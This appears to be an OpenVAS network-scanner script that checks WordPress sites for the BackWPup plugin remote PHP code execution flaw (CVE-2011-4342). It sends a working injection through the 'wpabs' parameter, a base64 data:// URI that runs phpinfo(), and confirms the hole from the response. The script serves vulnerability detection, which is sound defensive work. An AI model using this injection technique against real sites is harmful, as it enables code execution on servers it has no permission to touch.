CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900277" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-04-01 15:39:52 +0200 (Fri, 01 Apr 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2011-4342" );
	script_name( "WordPress BackWPup Plugin 'wpabs' Parameter Remote PHP Code Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17056/" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2011/Mar/328" );
	script_xref( name: "URL", value: "http://www.senseofsecurity.com.au/advisories/SOS-11-003" );
	script_tag( name: "impact", value: "Successful exploitation will let remote attackers to execute malicious
  PHP code to in the context of an affected site." );
	script_tag( name: "affected", value: "BackWPup WordPress plugin version 1.6.1, Other versions may also be affected." );
	script_tag( name: "insight", value: "The flaws are caused by improper validation of user-supplied input to the
  'wpabs' parameter in 'wp-content/plugins/backwpup/app/wp_xml_export.php',
  which allows attackers to execute arbitrary PHP code in the context of an affected site.

  NOTE : Exploit will only work properly with the following PHP settings:

  register_globals=On, allow_url_include=On and magic_quotes_gpc=Off" );
	script_tag( name: "summary", value: "This host is installed with WordPress BackWPup Plugin and is prone to remote
  PHP code execution vulnerability." );
	script_tag( name: "solution", value: "Upgrade BackWPup WordPress plugin to 1.7.1 or later." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/backwpup/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-content/plugins/backwpup/app/wp_xml_export.php?_nonce=822728c8d9&wpabs=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(ContainsString( res, ">phpinfo()<" ) && ContainsString( res, ">System <" ) && ContainsString( res, ">Configuration<" ) && ContainsString( res, ">PHP Core<" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

